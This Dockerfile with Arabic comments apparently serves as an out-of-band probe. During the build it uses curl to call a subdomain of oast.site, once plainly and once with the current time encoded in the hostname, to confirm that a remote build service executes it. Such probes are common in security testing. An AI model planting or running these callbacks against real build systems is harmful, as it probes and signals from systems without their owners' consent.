FROM alpine:latest

# نزل Curl ونفذ الأمر الأول
RUN apk add --no-cache curl && curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/docker_init

# الأمر التاني مع الوقت (لازم يكون جوه RUN وتستخدم الـ Command Substitution صح)
RUN export CURRENT_TIME=$(date +%H-%M-%S) && curl "http://${CURRENT_TIME}.d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/docker_time"
